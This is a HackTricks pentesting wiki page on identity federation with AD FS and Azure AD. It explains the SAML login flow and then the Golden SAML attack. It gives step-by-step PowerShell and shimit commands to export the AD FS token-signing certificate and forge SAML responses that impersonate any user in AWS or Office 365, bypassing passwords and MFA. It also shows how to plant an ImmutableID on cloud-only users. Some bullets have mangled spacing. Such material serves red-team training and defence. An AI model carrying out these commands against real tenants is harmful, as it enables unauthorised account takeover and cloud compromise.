# Federation

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic Information

**Federation** is a collection of **domains** that have established **trust**. The level of trust may vary, but typically includes **authentication** and almost always includes **authorization**. A typical federation might include a **number of organizations** that have established **trust** for **shared access** to a set of resources.

You can **federate your on-premises** environment **with Azure AD** and use this federation for authentication and authorization. This sign-in method ensures that all user **authentication occurs on-premises**. This method allows administrators to implement more rigorous levels of access control. Federation with **AD FS** and PingFederate is available.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

Bsiacally, in Federation, all **authentication** occurs in the **on-prem** environment and the user experiences SSO across all the trusted environments. Therefore, users can **access** **cloud** applications by using their **on-prem credentials**.

**Security Assertion Markup Language (SAML)** is used for **exchanging** all the authentication and authorization **information** between the providers.

In any federation setup there are three parties:

* User or Client
* Identity Provider (IdP):
* Service Provider (SP)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. First the user **tries to access an application** (also known as the SP i.e. Service Provider), that might be an AWS console, vSphere web client, etc. Depending on the implementation, the client may go directly to the IdP first, and skip the first step in this diagram.
2. The application then **detects the IdP** (i.e. Identity Provider, could be AD FS, Okta, etc.) to authenticate the user, **generates a SAML AuthnRequest** and redirects the client to the IdP.
3. The **IdP authenticates the user**, **creates a SAMLResponse** and posts it to the SP via the user.
4. SP **checks the SAMLResponse** and **logs the user in**. The SP must have a trust relationship with the IdP. The user can now use the service.

**If you want to learn more about SAML authentication and common attacks go to:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS is a claims-based identity model.
* "..claimsaresimplystatements(forexample,name,identity,group), made about users, that are used primarily for authorizing access to claims-based applications located anywhere on the Internet."
* Claims for a user are written inside the SAML tokens and are then signed to provide confidentiality by the IdP.
* A user is identified by ImmutableID. It is globally unique and stored in Azure AD.
* TheImmuatbleIDisstoredon-premasms-DS-ConsistencyGuidforthe user and/or can be derived from the GUID of the user.
* More info in [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML attack:**

* In ADFS, SAML Response is signed by a token-signing certificate.
* If the certificate is compromised, it is possible to authenticate to the Azure AD as ANY user synced to Azure AD!
* Just like our PTA abuse, password change for a user or MFA won't have any effect because we are forging the authentication response.
* The certificate can be extracted from the AD FS server with DA privileges and then can be used from any internet connected machine.
* More info in [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

From the previous schema the most interesting part is the third one, were the **IdP** generates a **SAMLResponse** authorising the user to sig in. Depending on the specific IdP implementation, the **response** may be either **signed** or **encrypted** by the **private key of the IdP**. This way, the **SP can verify** that the SAMLResponse was indeed created by the trusted IdP.

Similar to a [golden ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), with the **key** that **signs** the object which holds the **user‚Äôs identity** and **permissions** (_KRBTGT_ for golden ticket and token-signing private key for golden SAML), we can then **forge such an ‚Äúauthentication object‚Äù** (TGT or SAMLResponse) and **impersonate any user** to gain unauthorized access to the SP.

In addition, golden SAMLs have the following advantages:

* They can be **generated** from practically **anywhere**. You don‚Äôt need to be a part of a domain, federation of any other environment you‚Äôre dealing with
* They are effective even when **2FA** is enabled
* The token-signing **private key** is **not renewed** automatically
* **Changing** a user‚Äôs **password** **won‚Äôt affect** the generated SAML

#### AWS + AD FS + Golden SAML = ‚ô• (case study)

[Active Directory Federation Services](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) (**AD FS**) is a Microsoft standards-based domain service that allows the **secure sharing of identity information** between trusted business partners (**federation**). It is basically a service in a domain that provides domain user identities to other service providers within a federation.

Assuming AWS **trusts** the domain which you‚Äôve compromised (in a federation), you can then take advantage of this attack and practically **gain any permissions in the cloud environment**. To perform this attack, you‚Äôll need the **private key that signs the SAML** objects (similarly to the need for the KRBTGT in a golden ticket). For this private key, you don‚Äôt need a domain admin access, you‚Äôll only need the AD FS user account.

Here‚Äôs a list of the requirements for performing a golden SAML attack:

* **Token-signing private key**
* **IdP public certificate**
* **IdP name**
* **Role name (role to assume)**
* Domain\username
* Role session name in AWS
* Amazon account ID

_The mandatory requirements are highlighted. For the other non-mandatory fields, you can enter whatever you like._

For the **private key** you‚Äôll need access to the **AD FS account**, and from its **personal store** you‚Äôll need to **export the private key** (export can be done with tools like [mimikatz](https://github.com/gentilkiwi/mimikatz)). For the other requirements you can import the powershell snapin Microsoft.Adfs.Powershell and use it as follows (you have to be running as the ADFS user):

```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```

With all the information, it's possible to forget a valid SAMLResponse as the user you want to impersonate using [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud

```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

It's also possible to create ImmutableID of cloud only users and impersonate them

```powershell
# Create a realistic ImmutableID and set it for a cloud only user 
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```

## References

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
